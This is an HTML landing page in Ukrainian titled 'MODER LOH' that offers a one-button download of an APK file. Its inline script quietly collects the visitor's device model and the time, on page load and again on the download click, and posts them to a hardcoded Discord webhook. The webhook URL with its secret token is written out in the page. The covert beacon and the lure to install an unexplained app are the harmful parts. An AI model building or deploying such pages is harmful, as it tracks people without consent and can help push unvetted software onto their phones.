<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MODER LOH</title>
    <style>
        body {
            margin: 0;
            background-color: #000;
            color: white;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        h1 {
            font-size: 40px;
            color: #ff0000;
            margin-bottom: 30px;
        }
        .btn {
            display: inline-block;
            padding: 20px 45px;
            background-color: #00ff00;
            color: black;
            text-decoration: none;
            font-size: 22px;
            font-weight: bold;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <h1>MODER LOH</h1>
    <a href="app-debug.apk" download id="downloadBtn" class="btn">DOWNLOAD APK</a>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";

        // Асинхронна функція для пробиття "Android K"
        async function getDevice() {
            // 1. Спроба витягнути приховану модель через новий API (працює тільки на HTTPS)
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
                    if (hints.model) {
                        return `Android (${hints.model})`;
                    }
                } catch (e) {
                    console.error("Браузер не віддав модель", e);
                }
            }

            // 2. Якщо це старий браузер, iPhone, або сайт без HTTPS — пробуємо по-старому
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                const match = ua.match(/Android\s+([^\s;]+);?\s?([^;)]+)?/);
                let fallbackModel = match ? (match[2] || match[1]) : "Unknown";
                // Якщо браузер видав заглушку "K", так і напишемо
                return fallbackModel === 'K' ? "Android (Модель прихована браузером)" : `Android (${fallbackModel})`;
            } else if (/iPhone/i.test(ua)) {
                return "iPhone";
            } else {
                return "PC / Other";
            }
        }

        function getTime() {
            const now = new Date();
            return now.toLocaleString('uk-UA', { 
                day: '2-digit', 
                month: '2-digit', 
                year: 'numeric', 
                hour: '2-digit', 
                minute: '2-digit', 
                second: '2-digit' 
            }).replace(',', '');
        }

        async function sendLog(statusText, emoji) {
            const deviceName = await getDevice(); // Чекаємо, поки браузер віддасть модель
            const message = `${emoji} **${statusText}**\n\n` +
                            `📱 **Пристрій:** ${deviceName}\n` +
                            `⏰ **Час:** ${getTime()}`;

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            });
        }

        // Подія: зайшов на сайт
        window.onload = () => {
            sendLog("Хтось перейшов по посиланню!", "👤");
        };

        // Подія: натиснув скачати
        document.getElementById('downloadBtn').addEventListener('click', () => {
            sendLog("Почав скачувати файл!", "📥");
        });
    </script>

</body>
</html>
